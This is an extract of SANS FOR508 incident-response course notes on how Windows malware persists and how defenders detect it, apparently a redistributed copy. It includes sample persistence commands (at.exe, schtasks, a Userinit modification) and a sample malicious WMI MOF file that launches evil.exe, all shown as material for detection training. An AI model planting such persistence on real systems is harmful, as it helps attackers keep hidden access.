released, adversaries might have only a limited number of code signing certificates available and malware
developers might be supporting engagements across multiple targets. If certificates are re-used and one of the
samples is discovered and revoked, it could burn all the malware currently installed across those targets. Even
nation-states do not have unlimited resources and we have regularly seen these mistakes made in the wild. This
is one of the reasons it can be so lucrative for defenders to focus on digital signatures.
The Bottom Line:
There is still a chance that malware is signed. As a result, both signed and unsigned code should be examined.
However, it makes sense to first examine all suspicious unsigned code and any signed code from unrecognized
developers. You can eliminate the vast majority of signed code by initially trusting signed code from well-known
© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

65

.

companies such as Microsoft, Apple, and Google. We can also layer our detections by looking for unsigned
code in unusual locations. As an example, the Windows\System32 folder primarily contains files signed by
Microsoft. If you see something in that folder on a modern 64-bit operating system, you may have just found
malware!

66

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

Advanced Incident Response and Threat Hunting Agenda

Incident Response & Threat Hunting
Threat Intelligence
Malware-ology
Malware Persistence
Incident Response: Hunting Across the Enterprise
Credential Theft
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

67

.

This page intentionally left blank.

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

67

Malware Persistence
Malware needs to hide, but
it also must survive

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

This page intentionally left blank.

68

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

68

Malware Persistence Mechanisms
AutoStart Locations
Service Creation/Replacement
Service Failure Recovery
Scheduled Tasks
DLL Hijacking
WMI Event Consumers
More Advanced – Local Group Policy, MS Office Add-In, or BIOS Flashing
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

69

.

A majority of intrusions include at least some form of persistence. Most intrusions require long-term access to
achieve the attacker’s goals, making persistence something implemented early in the attack cycle. This is
exactly the reason it is a lucrative place for defenders to look for evil. We know it must be accomplished by the
attacker, and there is a relatively small set of common persistence mechanisms (actually, there are well over 50
in the Windows eco-system, but even this is a manageable number and only a small percentage are regularly
used). Another big benefit to finding evil persistence is it may allow us to identify attackers early in the kill
chain. Indicators early in the kill chain are sought after because the sooner you identify and remediate an
intrusion, the less cleanup required, and the less likely attackers are to have achieved their goals. We have
chosen to expand upon the most commonly seen persistence mechanisms for this section of the course. By some
estimates, including Mandiant’s M-Trends report, the first two (AutoStart locations and services) comprise over
80% of all persistence seen in the wild.

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

69

AutoStart Persistence Locations

Purpose
• Identify programs that start automatically at system boot or user logon

Locations
•NTUSER.DAT\Software\Microsoft\Windows\CurrentVersion\ Run
• NTUSER.DAT\Software\Microsoft\Windows\CurrentVersion\RunOnce
• SOFTWARE\Microsoft\Windows\CurrentVersion\Runonce
• SOFTWARE\Microsoft\Windows\CurrentVersion\policies\Explorer\Run
• SOFTWARE\Microsoft\Windows\CurrentVersion\Run
• SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit
• %AppData%\Roaming\Microsoft\Windows\Start Menu\Programs\Startup

Investigative Notes
• Excellent starting place to look for malicious activity on a system
• This slide represents only a fraction of possible locations
• AutoStart data compared across many systems (stacking) might help identify
compromised systems
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

AutoStart Persistence Locations
There are a daunting number of “autorun” locations available in Windows. In Microsoft-speak, these are also
known as AutoStart Extension Points (ASEPs), and they are one of the key reasons why Windows is so hard to
secure. A quick look at any number of blogs shows well over 50 ASEP locations that a malicious file can place a
reference to itself to ensure it survives a reboot. Luckily, many of the most common ASEP locations are in the
Registry, at least giving us a single place to look (even if there are over 500,000 Registry keys on a standard
system). A sampling of some common ASEPS is seen on this slide.
By far, the most popular ASEPs on the planet are the “run” Registry keys:
NTUSER.DAT\Software\Microsoft\Windows\CurrentVersion\Run
NTUSER.DAT\Software\Microsoft\Windows\CurrentVersion\Runonce
Software\Microsoft\Windows\CurrentVersion\Runonce
Software\Microsoft\Windows\CurrentVersion\policies\Explorer\Run
Software\Microsoft\Windows\CurrentVersion\Run
Items listed in these keys are executed when a user logs on—not at boot like other ASEPs. There is no specific
order to the startup, and multiple “run” keys exist in both the NTUSER.DAT and the SOFTWARE hives.
Less common, but equally lethal, is the Userinit key.
SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit
Typically, we would expect this value to contain only a reference to userinit.exe. By default, Winlogon executes
Userinit.exe and launches Explorer.exe. However, the key can be modified to include a reference like
C:\Windows\system32\userinit.exe,C:\Temp\winsvchost.exe and the malicious binary will also be executed at boot.
A final location to highlight is in the file system, not the Registry. This can actually be advantageous to an attacker
because creating persistence here does not require administrator rights. Even advanced attackers often use this
location as an early-stage persistence mechanism via phishing attacks.
70

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

70

%AppData%\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
Any shortcuts created in this folder will execute the representative binary upon user logon—easy and effective!
In the last few years an incredible amount of malware has gravitated back to this old attack vector. If you wait
long enough, what is old becomes new again!

.

Although these locations are very common for ASEPs, there are many, many more. Free forensic tools like
Registry Explorer and RegRipper have plugins to retrieve many common ASEPs from Registry hives. We will
shortly introduce tools like Autoruns and Kansa providing the ability to collect this information at scale. Further,
by collecting this data across many systems, frequency analysis can be conducted to help identify outliers that
can lead us to compromised systems.

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

71

Windows Services

• New Service Creation
• Start value set to 0x02 will start automatically
• IPRIP: RIP Listener Service (APT1)

• Service Replacement
• Modify and autostart a service to load new binary
• GlassRAT (China) used the disabled “RasAuto” Service

• Service Failure Recovery

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

Windows Services
Windows services are designed to run applications in the background without user interaction. Many services
are required at system boot, including the DHCP Client, Windows Event Log, Server, and Workstation services.
These services provide critical functionality for the OS and must be started immediately without requiring user
input. Services can be implemented as standalone executables or loaded as DLLs. To conserve resources, many
service DLLs are grouped together and run under a smaller set of svchost.exe instances. svchost.exe is a
Windows-generic service host process, and it is typical to see several running instances of svchost.exe (five or
more is common). Service configurations, as well as device driver configurations, are stored in the Registry
under HKLM\SYSTEM\CurrentControlSet\Services. The keys here provide the parameters for each service,
including the service name, display name, path to the service’s executable image file, the start value, required
privileges, dependencies, and more. Each service has a start type value configured to start at boot, by manual
intervention, or on trigger events such as obtaining an IP address or hardware device connections. Start values
of 0x02 (Automatic) and 0x00 (Boot start of a device driver) can provide persistence for malicious code.
Windows services provide great flexibility to developers, and similarly malware authors, for automatically
running code on a Windows host.
Because services can be configured to reliably start at boot (often before the loading of antivirus), they are a
very popular persistence vector. It also helps that the average Windows system can easily have over one
hundred services registered, making it very easy to hide in plain sight. With administrator rights, it is trivial to
either modify the Services Registry key or use the built-in “sc” command to create a service that auto-loads a
malicious DLL or executable. One of the classic APT examples of this technique is to add (or replace) the rarely
used RIP Listener Service (IPRIP) and use it to load a malicious executable. To give an example of how
prevalent this technique is, out of the 44 malware families enumerated in the Mandiant APT1 report, 14 used
Services for persistence.[1]
Service replacement is similar to service creation, but instead finds a current service that is disabled or unneeded
and replaces the existing binary with a malicious one. If the service is not already set to autostart, it is trivial to
modify the start type value for the service. This can be stealthier because it is normal for that service to be on the
system but requires finding an unimportant service to replace. This technique is not as common as simple
service creation due to the increased complexity. The GlassRAT backdoor employed by a China-based APT
group has been known to use this technique, abusing the frequently disabled “RasAuto” service.[2]
72

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

72

Even less common, but potentially stealthier, is using the service recovery mode option to load a malicious
binary when a specific service crashes. The example on this slide shows the Remote Desktop Services recovery
options set to run a program upon failure (typically, it would default to restarting the service). As Mark Baggett
points out in his post on the topic, this service might be particularly interesting because there are known
vulnerabilities for reliably crashing the RDP service.[3]
The Autoruns tools from Sysinternals provides an easy means to collect and analyze services on a system.
Alternatively, on live systems use the built-in “sc” command to query installed services, using parameters such
as “queryex,” “qc,” “qprivs,” and “qtriggerinfo” to get detailed information on service configurations. For
offline analysis, investigate service configurations within the Registry. Few tools collect service failure recovery
information, but the Kansa PowerShell framework has a script named Get-SvcFail.ps1 to collect it within its
default ASEP modules. Investigating unusual service crashes in the event logs might also provide clues.

.

[1] Mandiant APT1 samples categorized by malware families: http://for508.com/28vic
[2] Peering into GlassRAT (PDF): https://for508.com/cw1u[3] Wipe the drive! Stealthy Malware Persistence: http://for508.com/ojzea

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

73

Scheduled Tasks

• at.exe
• Deprecated, but still present in WinXP and Win7+
• Use recorded in at*.job files and Schdlgu.txt (XP)

• schtasks.exe
• Activity logged in Task Scheduler and Security logs

• Remote capabilities are commonly used for lateral
movement and credential dumping
• The SUNSPOT implant that inserted the backdoor into
SolarWinds builds used a scheduled task for persistence
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

Scheduled Tasks
Scheduled tasks provide an extremely granular means to create persistence in Windows. The at.exe command
has long been a core part of the hacker lexicon, most notably because in WinXP, it provided a very reliable
privilege escalation attack (“at” jobs originally ran as SYSTEM regardless of the user’s privilege level). Even
with that vulnerability patched, they are still commonly used by adversaries in Windows 7 environments, likely
due to familiarity or laziness (schtasks.exe requires more typing). When an “at” job is created, corresponding
“.job” files are created in the \Windows\Tasks and \Windows\System32\Tasks folders (the latter directory was
added in Windows 7 and records duplicate task information in XML format). These files are named sequentially
starting with “at1.job” and record details about what was scheduled. In XP, task information is also stored in the
C:\Windows\Schedlgu.txt log. A simple command might look like: at.exe 22:01:00
c:\temp\winsvchost.exe
The schtasks.exe tool is an upgraded version of at.exe and has an immense number of features allowing tasks to
be set and finely controlled. Tasks can even be set for specific Windows events, such as when a specific user
logs on, allowing much more creativity for persistence over just using specific times. New logging for scheduled
tasks appeared in Windows Vista, including a dedicated event log named “Task Scheduler Operational.” A
simple command might look like:
schtasks.exe /create /sc daily /tn winsvchost /tr c:\temp\winsvchost.exe
/st 22:01:00
Interestingly, both commands have the ability to schedule tasks on remote systems. As you might imagine, this
opens interesting possibilities for attackers. Remote scheduled tasks are routinely used to spread malware
(including backdoors), execute batch scripts, and perform routine actions like credential dumping across many
systems. Most forensic artifacts for these remote tasks will be present on the systems they were executed on, not
the originating system.
It is shocking how often such a simple persistence mechanism is used even in advanced attacks. During the
SolarWinds supply-chain investigation, investigators discovered the SUNSPOT malware responsible for
inserting the backdoor into the software builds was executed by a scheduled task set to start at system boot time.
The Autoruns tool from Sysinternals will collect currently scheduled jobs from the task scheduler service and
later in class we will explore the comprehensive logging of tasks provided by Windows.
74

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

74

DLL Hijacking Attacks

DLL Search Order Hijacking
• Place malicious file ahead of DLL in search order
• Classic example is Explorer.exe loading bad ntshrui.dll

Phantom DLL Hijacking
• Find DLLs that applications attempt to load, but either don’t exist or
can be replaced
• fxsst.dll (Fax Service)

DLL Side-Loading
• WinSxS mechanism provides a new version of a legit DLL
• PlugX, NetTraveler, Sakula, Poison Ivy (RATs)

Relative Path DLL Hijacking
• Copy susceptible .exe and corresponding bad .dll to location of choice
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

75

.

DLL Hijacking Attacks
DLL persistence hijacks attack legitimate and legacy features of the Windows operating system. Search order
hijacking is an excellent example. It turns out that when an executable runs in Windows, it is not required to
hardcode the location of any required dynamically loaded libraries (DLLs). Instead, a specific search order is often
used to find the required DLL, starting with the local directory the .EXE is run from and eventually ending up in a
folder like C:\Windows\System32 where most standard DLLs exist. The only real exception is for DLLs present in
the KnownDLLs Registry key that does effectively hardcode a small number of specific system DLL locations. If
adversaries can find an executable that is not located in the System32 folder and loads a DLL not present in the
KnownDLLs Registry key, they can place a malicious DLL in the same folder as the target executable and trump the
search order, ensuring their bad code is loaded whenever that application starts. Amazingly, there are lots of these
susceptible locations going back all the way to Windows 2000. A classic example was documented in the wild by
Mandiant where Explorer.exe (the Windows GUI desktop) loaded a vulnerable DLL (not protected by KnownDLLs)
named “ntshrui.dll.”[1] Because Explorer.exe is located in the \Windows folder and the legitimate ntshrui.dll is
located in the \Windows\System32 folder, all the attackers had to do is find a way to drop their malicious dll (named
“ntshrui.dll”) into the \Windows folder, and it would be executed every time the desktop was started. Winning!
Because this is directly related to backward compatibility, there is no likely fix on the horizon. File system forensic
analysis looking for newly created DLLs in unusual locations is usually the best way to discover it. The following is
a search order common to modern systems with the option SafeDllSearchMode enabled (enabled by default)[2]:
1.
2.
3.
4.
5.
6.
7.
8.
9.

DLLs already loaded in memory
Side-by-Side Components
KnownDLLs list
Directory from which application is loaded
C:\Windows\System32
C:\Windows\system
C:\Windows
Current Directory
System %PATH%

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

75

Phantom DLL hijacking is a similar attack but uses the fact that some very old DLLs are still attempted to be
loaded by applications even when they are completely unnecessary. In fact, some applications try to load very
old DLLs that no longer even exist on modern Windows operating systems! If attackers can find such a DLL
(and many are already documented), placing a properly crafted malicious file with the same name of that longforgotten DLL in the search path can lead to code execution.[3] Similarly, even if the DLL exists, it might be
largely unused and easily replaced with a trojanized version. A great example of this type of attack is the
replacement of the fxsst.dll (Fax Service) DLL in the System32 folder documented by Mandiant.[4]
DLL side-loading has a similar sounding name but is actually quite different than the previous two attacks. This
attack uses the Windows side-by-side (SxS) DLL loading mechanism to introduce an “updated” version of a
DLL. SxS functionality is a legitimate feature of Windows and is used by many applications to prevent problems
that can arise due to updated and duplicate versions of DLLs. SxS gives the ability to load updated DLLs but has
few validity checks for these new DLLs and thus the loading mechanism can be abused due to missing DLLs,
use of relative paths, and other shortcuts not taken into account by the application developer. This attack is often
used to circumvent AV protections and provides an opportunity for a known good, even digitally signed,
executable to be used as the persistence mechanism. The most notable example is the very popular PlugX RAT,
which drops a legitimate executable (with a hash present in the NSRL known good hash database) and then uses
SxS during runtime to load and construct a malicious DLL in memory. Amanda Stewart at FireEye wrote an
excellent whitepaper describing the process.[5] PlugX is not alone—a wide variety of remote access tools, such
as NetTraveler, use similar techniques.[6] Similar to other DLL persistence attacks, the best way to discover this
behavior is to identify new executables and helper files added to the system during the attack (PlugX often
creates three new files on the system).

.

Finally, we have the simplest option, relative path DLL hijacking. This attack could also be called “bring your
own executable”. Write permissions on sensitive folders like Windows and Windows\System32 are required to
accomplish some of the more interesting search order hijacking attempts. Those folders may also be more
closely watched by host-based security mechanisms. So, an alternative is to just copy a susceptible executable
from one of the protected folders to any writable location. Then add the bad .DLL to be loaded in the same
folder, and voila, you now have an incredibly easy way to get the bad code loaded. While the list of susceptible
system binaries numbers in the hundreds and this attack is very easy to accomplish, the downside is you will
now have a system executable (and likely persistence mechanism) running from the wrong location (wherever it
was copied to). This attack is one of the most commonly used today (groups like APT32 are famous for using it,
as are some variants of Poison Ivy and PlugX malware) and should be one of the easiest for analysts to identify
with a combination of file system timelining and memory process analysis.
There are almost no viable mitigations for this variety of attack. Technically, the Microsoft Exploit Protection
feature, “validate image dependency integrity” should work but only in limited cases where it is enabled and
only for applications which solely use Microsoft signed DLLs. “DLL rules” can be applied via
AppLocker/Device Guard to limit from where DLLs can be loaded, but this is also only likely to be viable for
very locked down systems with few applications installed.
[1] Malware Persistence without the Windows Registry: http://for508.com/v2su7
[2] Dynamic-Link Library Search Order - Microsoft Docs: https://for508.com/9j5np
[3] Phantom DLL Hijacking: http://for508.com/m4frx
[4] What the fxsst?: http://for508.com/sgeyk
[5] DLL Side-Loading: A Thorn in the Side of the Anti-Virus Industry (PDF): http://for508.com/z8ni0
[6] NetTraveler APT Targets Russian, European Interests: http://for508.com/78nj2
[7] DLL rules in AppLocker: https://for508.com/lkpf9

76

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

Hunting Notes: DLL Hijacking
DLL hijacking is excellent for persistence but is also commonly used to evade hostbased security and to achieve privilege escalation
• File system analysis: Look for new or unsigned .exe/.dll files in unusual places

• Memory Analysis: Find system processes or DLLs loaded from wrong location

Legit McAfee

Evil DLL

• Hijacking is often paired with other tradecraft like code injection and command
and control network beaconing that can also lead to detection
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

77

.

DLL hijacking can be a very stealthy attacker technique but is often easily defeated with thorough forensic
analysis. Nearly all DLL hijacks require placing a new DLL and/or executable onto the file system. This
presents a useful detection point since newly created DLLs and executables are rare on most systems. Paying
attention to newly created files around a time of interest is a classic forensic timelining technique that we will
see later in the class. Memory forensics is another technique well suited to finding code running from unusual
locations since all legitimately loaded code must come from disk. By looking for processes that should not be
running, or those loading DLLs from strange locations, an analyst could easily find evidence of DLL hijacking
in memory. Also note that hijacked DLLs tend to be the more obscure ones because the most common DLLs are
already loaded in memory, preempting the loading of any evil versions with duplicate names (Windows first
checks if a DLL is already loaded in memory before looking on disk). Added to this is code loaded through
hijacking almost always performs other actions likely to draw the eye of an investigator. These could include
reaching out over the network, creating named pipes, or injecting code into other processes. We will have many
ways throughout the course to detect anomalous actions and any of them could lead back to a DLL in a strange
location, and ultimately help you discover a DLL hijack attack.
The examples on this slide show evidence of a relative path DLL hijack attack commonly tied to the Ocean
Lotus/APT32 threat actor. The executable mcoemcpy.exe is legitimate, digitally signed software from McAfee.
It has been copied to an unusual location (ProgramData folder) along with a malicious DLL, McUtil.dll. Upon
execution, mcoemcpy.exe also loads McUtil.dll. A keen analyst might wonder why these newly created files
were present in the root of the ProgramData folder, a location not typically known to hold executable files. If
some of the tool output on this slide is unfamiliar to you, don’t worry, we will be covering them in depth in later
sections. Another interesting detection has been proposed by Matt Green of the Velociraptor project. In many
hijacks, the malicious DLL still needs to proxy legitimate function requests to the original DLL. Creating
forwarded functions within the evil DLL is an easy way to accomplish this. While forwarded functions can be
legitimate, it is rare to see two DLLs with the same name (but different locations) forwarding functions to each
other, especially outside of folders like WinSxS. Velociraptor has VQL designed to look for this pattern.[1]
[1] Detecting DLL Hijacking With Velociraptor: https://for508.com/tsgpy

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

77

WMI Event Consumer Backdoors

WMI allows triggers (filters) to be set that when
satisfied will run scripts or executables
1. Event Filter →
2. Event Consumer →
3. Binding →

Trigger condition
Script or executable to run
Tie together Filter + Consumer

• Filters can be based on time (every 20 sec), service
start, user auth, file creation, etc.
• PowerShell or mofcomp.exe can be used for setup
• The PowerShell cmdlet “Get-WmiObject” can
identify and help remove suspicious entries
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

WMI Event Consumer Backdoors
WMI is often overlooked by security professionals, but it contains very powerful capabilities that have not gone
unnoticed in the hacker community. One of the more recent persistence methods identified in the wild has been the
use of WMI Event Consumers. WMI provides the ability to monitor for specific events and when triggered, alert
event consumers that can then do things like run scripts and execute code.[1] Administrative privileges are
necessary, but once achieved, attackers can use WMI to create a backdoor that is difficult to detect without the
proper tools. WMI consumers run with SYSTEM privileges.
The technique requires three discrete steps:
1) An event filter must be created describing a specific trigger to detect (for example, trigger every twenty
seconds).
2) An event consumer is added to the system with a script and/or executable to run (run a PowerShell script to
beacon to a command and control server).
3) Finally, the event and consumer are tied together via a binding, and the persistence mechanism is loaded into
the WMI repository.
The three steps are often written inside a managed object format (MOF) file that is used to register new classes into
the WMI repository. To be even more stealthy, PowerShell Set-WmiInstance or CreateInstance can also
be used. Event filters can be set up to trigger immediately upon being registered or via virtually any other windows
event such as a specific time, the existence of a file or folder, service starting or stopping, a specific user being
authenticated, etc.
This type of attack is not theoretical. Stuxnet was perhaps the first sample in the wild to use the attack.[2] It used a
zero-day vulnerability in the print spooler (MS10-061) to allow the transfer of two files to remote systems—an
.EXE and a .MOF file. The .MOF file was auto-compiled by the system, creating a WMI event filter and consumer
to immediately execute the .exe file. Wow! Now modern malware samples like ransomware and crypto-worms
have picked up where Stuxnet left off.

78

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

78

Chris Glyer gave an excellent presentation describing the (limited) forensic artifacts left behind by WMI Event
Consumers.[3] The Sysinternals tool Autoruns and the Kansa PowerShell framework both identify WMI event
filters and consumers.[4] The PowerShell cmdlet “Get-WmiObject” can also be used as a native means to identify
and help remove suspicious entries.
The contents of a sample malicious MOF file follows:
#PRAGMA AUTORECOVER
#PRAGMA NAMESPACE("\\\\.\\root\\subscription")
instance of FilterToConsumerBinding {
Filter = $Filter;
Consumer = $Consumer;
};
instance of EventFilter as $Filter {
EventNamespace= "ROOT\subscription";
Name = "GenericFilter";
QueryLanguage = "WQL";
Query =
"SELECT * FROM InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA
'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 200 AND
TargetInstance.SystemUpTime < 320";
};
instance of CommandLineEventConsumer as $Consumer {
Name = "GenericConsumer";
RunInteractively=false;
CommandLineTemplate="C:\Windows\evil.exe";
};

.

[1] Monitoring Events: http://for508.com/2jh-f
[2] Stuxnet Under the Microscope (PDF): http://for508.com/lj9em
[3] There’s Something About WMI (PDF): http://for508.com/kc36x
[4] Kansa and WMI Event Consumers: http://for508.com/x36i8

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

79

Using PowerShell to Discover Suspicious WMI Events
Get-WMIObject -Namespace root\Subscription -Class
Get-WMIObject -Namespace root\Subscription -Class
Get-WMIObject -Namespace root\Subscription -Class

EventFilter
EventConsumer
FilterToConsumerBinding

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

While WMI and PowerShell can be used for attacks, they equally can be used for defense. Native support for
WMI and easy scalability makes PowerShell an obvious choice for detecting attacks like WMI event consumers.
This is great news because you do not need any fancy tools for detection of one of the more insidious WMI
threats. The commands seen on this slide collect the WMI event filters, consumers, and bindings on a system.
You can be more specific by using the class parameter (e.g., -Class CommandLineEventConsumer), but
that is only recommended if you are unable to allowlist the standard false positives. You may also consider
running the command twice—once as you see on this slide, querying the “root/Subscription” namespace, and
once again for the “root/Default” namespace. Microsoft documentation and most of the event consumers seen in
the wild use the standard “root/Subscription” namespace, but it is possible to accomplish the same evil
persistence by embedded in the “root/Default” namespace. As organizations get better at finding the standard
consumers, attackers may move to non-standard locations. Knowing this, the following set of commands would
be a best practice:
Get-WMIObject -Namespace root\Subscription -Class
Get-WMIObject -Namespace root\Subscription -Class
Get-WMIObject -Namespace root\Subscription -Class

EventFilter
EventConsumer
FilterToConsumerBinding

and
Get-WMIObject -Namespace root\Default -Class
Get-WMIObject -Namespace root\Default -Class
Get-WMIObject -Namespace root\Default -Class

EventFilter
EventConsumer
FilterToConsumerBinding

The example on the slide shows a clearly bad consumer, with an encoded PowerShell script as the payload. Also
note that the Kansa IR collection framework has pre-built PowerShell scripts to collect this information at scale
(including collection from both the Subscription and Default namespaces).

80

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

80

Scaling PowerShell Collection

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

81

.

While WMI event consumers can be audited on a single system via PowerShell, a more likely scenario is
collecting the information from hundreds or thousands of systems using something like PowerShell remoting.
That data could then be placed into a database (an ELK stack[1] or Splunk are two good options) where it could
be hunted through for anomalies. There are legitimate use cases for WMI event consumers, and nearly every
system has some (the “SCM Event Log Consumer” seen on this slide is one common example). However, those
legitimate consumers are small in number and predictable, making them easy to allowlist. Event consumers like
the one seen on this slide should stick out, even among thousands of systems, if only because “powershell” is a
great filter term to find evil in this type of dataset.
[1] ELK Stack: Elasticsearch, Logstash, Kibana – http://for508.com/q1r94

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

81

Hunting Notes: WMI Persistence

• Focus on Consumers (CommandLine and ActiveScript)
• Later, the Event Filter (trigger event) can be determined

• Interesting search terms:
.exe

.vbs

.ps1

.dll

.eval

ActiveXObject

powershell

CommandLineTemplate

ScriptText

• Common false positives:
SCM Event Log Consumer

BVTFilter

TSlogonEvents.vbs

TSLogonFilter

RAevent.vbs

RmAssistEventFilter

KernCap.vbs

NTEventLogConsumer

WSCEAA.exe (Dell)

Note: Be careful when global allowlisting. Attacker consumers named “SCM Event Consumer” seen in the wild

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

When hunting WMI event data in the enterprise, you will need to develop an allow-list and filters to facilitate
anomaly detection in large datasets. If you are collecting this data, there are some excellent opportunities for big
wins here. First, focus on event consumers (as opposed to event filters and bindings). The consumers typically
have far more interesting data to facilitate high fidelity searching on blocklist terms.

.

Once you identify a bad consumer, you can then use the name of the consumer to find the binding and
associated event filter for the consumer. While not always necessary, the event filter can give more insight into
what was used to trigger the execution of that consumer (every five minutes, at boot, whenever a specific user
logged on, etc.)
Once you collect some data at scale within the organization, building an allowlist of common normal consumers
should be straightforward. Each environment will be different, but this slide lists some of the most frequent
legitimate consumers found. A word of caution! From time to time, audit your allowlist to make sure it is not too
permissive. As an example, the BadRabbit ransomware variant named their evil event consumer “SCM Event
Consumer” to try to blend in (and potentially take advantage of any allowlisting). The normal legitimate
consumer with this name is slightly different: “SCM Event Log Consumer.” Other ransomware variants have
used “SCM Events Log Consumer. There have also been reports of the legitimate (and very common)
KernCap.vbs script overwritten with a malicious script with the same name. It is best to keep in mind that
attackers will try to use our tools and techniques against us!
Notice that this slide calls out two specific types of consumers on which to focus. When investigating WMI
event consumers, you may encounter several different types of consumers.[1] To further reduce our data set, we
can focus on two used by all of the current attacks seen in the wild: CommandLineEventConsumers and
ActiveScriptEventConsumers.
CommandLineEventConsumers allow the payload of an event filter (trigger) to be an executable. You may see a
malicious executable, such as evil.exe, in the properties, or something more complex like rundll32.exe or
powershell.exe along with parameters.

82

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

82

ActiveScriptEventConsumers are the second common vector for evil event consumers. They are incredibly
flexible, using either a path to a script on disk or simply script text. Visual Basic or JScript are the two supported
scripting languages for these types of consumers. You will not see PowerShell scripts in this type of consumer.
The capabilities of the other possible event consumers can be found in the following table:

.

[1] Standard Consumer Classes | Microsoft Docs: http://for508.com/9oah4

© 2023 SANS Institute

J

83

autorunsc.exe: Detecting Malware Persistence Mechanisms
AutoStart Locations
Service Creation/Replacement
Service Failure Recovery (Kansa Get-SvcFail.ps1)
Scheduled Tasks
DLL Hijacking (Timelining/File System Forensics)
WMI Event Consumers
More Advanced: Group Policy, MS Office Add-In, or BIOS Flashing (Varies)
FOR508 | Advanced Incident Response,Threat Hunting, and Digital Forensics

.

Autorunsc.exe: Detecting Malware Persistence Mechanisms
Similar to application vulnerabilities, we will likely never reach the end of new persistence mechanism
discoveries. The top six items on this list comprise probably 98% of those you are likely to find, with the other
2% being rare and esoteric examples of firmware implants, new forms of DLL hijacking, etc. Although some
persistence mechanisms are most often identified via timelining and disk forensics (DLL Hijacking and Group
Policy scripts come to mind), the Autoruns tool from Sysinternals has the ability to collect data from the vast
majority of other ASEPs. It is a go-to tool for incident responders and is often one of the first items reviewed
in an investigation.[1]
An exciting open-source project aiming to replicate Autoruns in PowerShell is PowerShell Sniper.[2] It is
available in the PowerShell Gallery and digitally signed. Data is returned as PowerShell objects and available
for further post-processing.
[1] Sysinternals Autoruns: https://for508.com/m6chi
[2] Persistence Sniper: https://for508.com/6jwge

84

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

84

Live System Only: autorunsc.exe
C:\>autorunsc -accepteula [options] > \\server\share\autoruns.csv

autorunsc –v [options] > output-file.csv
[Useful Options]
-accepteula

specifies whether to automatically accept the
Microsoft software license
Show all entries
Show file hashes
Hide signed Microsoft entries
Verify digital signatures
Print output as CSV

-a *
-h
-m
-s
-c

-v[rs]

Query VirusTotal for malware based on file hash
Using autorunsc.exe from the command line

C:\>autorunsc -accepteula –a * -s –h –c -vr >
\\siftworkstation\cases\Response\10.3.58.7-arun.csv
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

85

.

From the Sysinternals tool page for autorunsc.exe:
This utility, which has the most comprehensive knowledge of autostarting locations of any startup monitor,
shows you what programs are configured to run during system bootup or login, and when you start various
built-in Windows applications like Internet Explorer, Explorer, and media players. These programs and drivers
include ones in your startup folder, Run, RunOnce, and other Registry keys. Autoruns reports Explorer shell
extensions, toolbars, browser helper objects, Winlogon notifications, autostart services, and much
more. Autoruns goes way beyond other autostart utilities.
Usage
Autorunsc is the command line version of Autoruns. Its syntax is:
Usage: autorunsc [-a <*|bdeghiklmoprsw>] [-c|-ct] [-h] [-m] [-s] [-u] [-vt] [[-z <systemroot> <userprofile>] |
[user]]]
-a Autostart entry selection:
* All.
b Boot execute.
c Codecs.
d Appinit DLLs.
e Explorer add-ons.
g Sidebar gadgets (Vista and higher)
h Image hijacks.
i Internet Explorer add-ons.
k Known DLLs.
l Logon startups (this is the default).
m WMI entries.
n Winsock protocol and network providers.
o Office add-ins.
p Printer monitor DLLs.
r LSA security providers.
s Autostart services and non-disabled drivers.
t Scheduled tasks.
© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

85

w
-c
-ct
-h
-m
-s
-t
-u

Winlogon entries.
Print output as CSV.
Print output as tab-delimited values.
Show file hashes.
Hide Microsoft entries (signed entries if used with -s).
Verify digital signatures.
Show timestamps in normalized UTC (YYYYMMDD-hhmmss).
If VirusTotal check is enabled, show files that are unknown
by VirusTotal or have non-zero detection; otherwise, show only
unsigned files.
-x Print output as XML.
